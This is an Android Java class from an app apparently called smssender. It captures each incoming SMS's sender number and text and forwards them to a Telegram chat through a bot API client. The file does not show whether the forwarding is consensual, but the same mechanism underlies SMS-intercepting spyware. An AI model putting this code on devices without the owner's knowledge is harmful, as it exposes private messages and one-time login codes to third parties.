package com.agayev.smssender;

import static com.agayev.smssender.SMSReceiver.TELEGRAM_CHAT_ID;
import static com.agayev.smssender.SMSReceiver.TELEGRAM_TOKEN;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

import com.agayev.smssender.network.ApiClient;

public class SmsHandler {
    private ApiClient client;

    public SmsHandler() {
        client = new ApiClient();
    }

    public void handleSms(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                StringBuilder messageBodyBuilder = new StringBuilder();
                String phoneNumber = null;
                for (Object pdu : pdus) {
                    SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                    String msg = smsMessage.getMessageBody();
                    messageBodyBuilder.append(msg);
                    if (phoneNumber == null) {
                        phoneNumber = smsMessage.getOriginatingAddress();
                    }
                }
                String messageBody = messageBodyBuilder.toString();
                String fullMessage = "Номер телефона:" + phoneNumber + " Смс:" + messageBody;
                client.sendMessage(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, fullMessage);
            }
        }
    }
}
